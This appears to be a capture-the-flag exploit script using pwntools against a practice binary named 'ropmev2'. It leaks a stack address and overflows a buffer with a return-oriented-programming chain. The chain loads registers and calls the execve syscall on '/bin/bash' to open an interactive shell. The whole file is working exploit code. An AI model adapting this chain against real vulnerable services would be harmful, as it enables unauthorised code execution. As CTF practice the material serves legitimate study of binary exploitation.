from pwn import *
#context_level='DEBUG'

p = process("./ropmev2")

def main():

	pop_rdi_ret = 0x000000000040142b # pop rdi ; ret
	syscall = 0x0000000000401168 # syscall
	pop_rax = 0x0000000000401162 # pop rax ; ret
	pop_rsi_r15 = 0x0000000000401429 # pop rsi ; pop r15 ; ret
	pop_rdx_r13 = 0x0000000000401164 # pop rdx ; pop r13 ; ret

	p.sendline("DEBUG")
	print(p.recvuntil("I dont know what this is "))
	leak = int(p.recvline().strip("\n"), 16)
	print("Address: " + hex(leak))

	bin_bash = leak - 0x12

	print("bin_bash: " + hex(bin_bash))

	padding = "\x00XXXXXXX" + "/bin/bash\x00"
	padding = "A"*(216-len(padding)) + padding

	payload = padding
	payload += p64(pop_rdi_ret)
	payload += p64(bin_bash)
	payload += p64(pop_rsi_r15)
	payload += p64(0)
	payload += p64(0)
	payload += p64(pop_rdx_r13)
	payload += p64(0)
	payload += p64(0)
	payload += p64(pop_rax)
	payload += p64(0x3b)
	payload += p64(syscall)

	p.send(payload)

	p.interactive()

if __name__=="__main__":
	main()
